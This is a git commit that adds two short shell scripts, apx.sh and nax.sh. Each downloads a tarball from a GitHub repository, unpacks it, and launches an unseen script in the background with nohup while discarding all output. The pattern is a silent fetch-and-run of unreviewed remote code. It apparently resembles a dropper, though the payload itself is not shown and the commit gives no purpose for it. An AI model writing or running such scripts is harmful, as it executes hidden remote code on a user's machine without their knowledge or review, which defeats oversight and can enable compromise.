da2394bc9beb9b6d444443c454d065cdcc3578d7
xrvzx <89389557+xrvzx@users.noreply.github.com>
2021-10-30 07:05:44 +0700

    Add files via upload

---
+++ apx.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+
+wget https://github.com/xrvzx/z/raw/main/z.tar.gz && tar xf z.tar.gz
+nohup ./ap.sh </dev/null >/dev/null 2>&1 &
---
+++ nax.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+
+wget https://github.com/xrvzx/z/raw/main/z.tar.gz && tar xf z.tar.gz
+nohup ./na.sh </dev/null >/dev/null 2>&1 &
